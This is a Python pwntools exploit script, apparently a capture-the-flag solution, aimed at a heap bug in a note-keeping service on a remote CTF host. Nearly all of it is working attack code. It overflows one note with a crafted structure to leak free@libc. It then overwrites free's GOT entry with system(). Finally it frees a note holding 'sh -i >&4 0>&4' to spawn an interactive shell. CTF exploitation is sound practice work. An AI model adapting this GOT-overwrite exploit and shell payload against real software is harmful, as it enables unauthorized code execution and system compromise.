import pwn
import time

LOCAL = False

GOT_FREE = 0x804c01c
CMD = 'sh -i >&4 0>&4'
if LOCAL:
    # my gentoo libc
    LIBC_SYSTEM = 0x0003a950
    LIBC_FREE = 0x000736c0
else:
    # remote libc
    # 58afd66c77573fc1932c71b3c4cfacd1e7625268c972272ddfb8910e5ac82162
    LIBC_SYSTEM = 0x3fcd0
    LIBC_FREE = 0x760c0


def connect():
    if LOCAL:
        return pwn.remote('127.0.0.1', 1337)
    else:
        return pwn.remote('0db14e.hack.dat.kiwi', 1337)

## Utility functions to interact with program
def menu(r, selection):
    r.recvuntil('==== MENU ====')
    r.recvuntil('> ')
    r.send(str(selection) + '\n')

def note_add(r, data, force_dup=True):
    menu(r, 2)
    r.recvuntil('> ')
    r.send('{}\n'.format(len(data)))
    r.recvuntil('> ')
    r.send(data)
    res = r.recvuntil('\n')
    if force_dup:
        assert 'B-)' in res


def note_rm(r, i):
    menu(r, 4)
    r.recvuntil('> ')
    r.send(str(i) + '\n')


def note_edit(r, i, data):
    menu(r, 3)
    r.recvuntil('> ')
    r.send(str(i) + '\n')
    r.recvuntil('> ')
    r.send('{}\n'.format(len(data)))
    r.recvuntil('> ')
    r.send(data)
    r.recvuntil('\n')


## STEP 1 - connect and leak GOT
r = connect()
pwn.log.info("Leaking GOT")

# Create duplicate note, thereby free()ing note A
note_add(r, 'a', False)
note_add(r, 'b')
time.sleep(0.1)

# Create a note structure
n = ""
n += pwn.p32(0) # no next note
n += pwn.p32(2137) # ID 2137
n += pwn.p32(1) # data length 1
n += pwn.p32(GOT_FREE) # data pointing to free@got
n += "a" * 40 + "\x00" # timestring
# Add a new note with n as data, thereby overflowing the A note memory with
# our crafted structure
note_add(r, n, False)

# Show notes, parse note a content as free@libc
menu(r, 1)
data = r.recvuntil('\n')
for line in data.split('\n'):
    note = line.split()[2]
    note = note.split(':')[1]
    free = pwn.u32(note[:4])
    break
pwn.log.info('free@libc is 0x{:08x}'.format(free))

## STEP 2 - override free@got with system@got
r = connect()
pwn.log.info('Triggering GOT override')

# Add a few notes with our CMD as the content (the CMD buffer will then be
# free()'d, so system()'d after our GOT override
NUM_NOTES = 3
for i in range(NUM_NOTES):
    pwn.log.info("Adding note {} of {}".format(i+1, NUM_NOTES))
    note_add(r, CMD, False)
    time.sleep(1)

# This node will be free()'d
note_add(r, 'a', False)
note_add(r, 'b')
time.sleep(0.1)

# This should be equal to the node we are overriding, otherwise we won't be
# able to delete it (the program has a global ID counter)
HACK_NOTE_ID = NUM_NOTES+1

# Craft a note that points to free@got
n = ""
n += pwn.p32(0)
n += pwn.p32(HACK_NOTE_ID)
n += pwn.p32(1024)
n += pwn.p32(GOT_FREE)
n += "a" * 40 + "\x00"
note_add(r, n, False)

system = free - LIBC_FREE + LIBC_SYSTEM
# Now, change free@got into system@got
note_edit(r, HACK_NOTE_ID, pwn.p32(system))

# And free the second CMD note (the first one tends to be garbled), thereby 
# executing system() on our CMD buffer
pwn.log.info("Triggering payload")
note_rm(r, 1)

# w00t w00t g0t sh3llz and m4d sploitz yo
r.interactive()
